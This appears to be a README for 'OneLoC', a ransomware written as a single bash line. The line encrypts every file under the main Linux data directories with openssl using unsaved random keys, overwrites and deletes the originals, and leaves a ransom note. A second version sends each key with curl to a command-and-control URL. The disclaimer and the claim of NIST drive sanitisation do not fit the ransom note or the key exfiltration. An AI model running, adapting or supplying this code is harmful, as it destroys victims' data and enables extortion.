# Ransomware-Oner-Line - OneLoC 

This is a code for ransomware in bash script oner line. !!! PURELY FOR ACADEMICAL PURPOSES !!!  

I am not responsible in any way for the misuse of this script, this is code normally installed in any linux distribution  
that has been bundled in a way to encrypt all data using AES-CBC-256 encryption with openssl.  

This script was developed for the purpose of sanitizing physical storage drives for disposal to NIST-800-88 standard  

With great powers, great responsibilities...  

### OneLoC Code
#### One LoC: One Line Of Code

```
Ransom@OneLoC:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
```

#### With Exfiltration:  
```
Ransom@OneLoC:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && curl -s -X GET https://c2.att.ck/exfilt.php?key=$CODE -k && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
```   
   
   
   
  ### Code explained   
> [Explained](https://explainshell.com/explain?cmd=for+i+in+%24%28find+%2Fhome+%2Fmedia+%2Fmnt+%2Fopt+%2Froot+%2Fsrv+%2Ftmp+%2Fvar+-type+f%29%3B+do+rdc%3D%24%28mktemp+-u%7Crev%7Ccut+-d%22.%22+-f1%29+%26%26+CODE%3D%24rdc%24RANDOM+%26%26+openssl+enc+-aes-256-cbc+-a+-salt+-in+%24i+-out+%24i.LoC+-k+%24%28echo+-n+%24CODE+%7C+base64+%7C+sha256sum%29+%26%26+echo+%22OneLoC+Anti-Forensic...%22+%3E+%24i+%26%26+rm+-rf+%24i%3Becho+%27All+your+files+has+been+encrypted+by%3A+OneLoC+%21%27+%3E+%24HOME%2FREADME.TXT%3Bdone+%3E%2Fdev%2Fnull+2%3E%261%26)
